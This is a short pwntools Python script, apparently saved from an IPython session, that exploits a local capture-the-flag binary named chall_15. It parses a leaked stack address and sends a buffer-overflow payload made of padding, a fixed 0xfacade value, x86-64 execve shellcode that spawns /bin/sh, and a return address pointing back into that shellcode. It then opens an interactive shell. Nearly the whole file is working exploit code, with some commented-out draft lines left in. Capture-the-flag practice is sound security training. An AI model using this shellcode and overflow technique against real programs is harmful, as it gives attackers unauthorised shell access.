# coding: utf-8
from pwn import *
binary=ELF("./chall_15")
p=process("./chall_15")
p.sendline()
resp=p.recv()
resp
addr=int(re.findall(b"([a-f0-9]{8,16})",resp)[0],16)
addr
#shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#get_ipython().magic('save exploit_15.py 1-9')
#payload = b"A"*(0x4e-0x44)+p32(0xfacade)+shellcode
shellcode=b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = b"A"*(0x4e-0x44)+p32(0xfacade)+shellcode
#len(payload)
payload+=b"A"*(0x4e-len(payload)-0xc)+p32(0xfacade)
#payload+=b"A"*(0x4e-len(payload)+p64(addr+14))
#payload+=b"A"*(0x4e-len(payload))+p64(addr+14))
payload+=b"A"*(0x4e-len(payload))+p64(addr+14)
p.sendline(payload)
p.interactive()
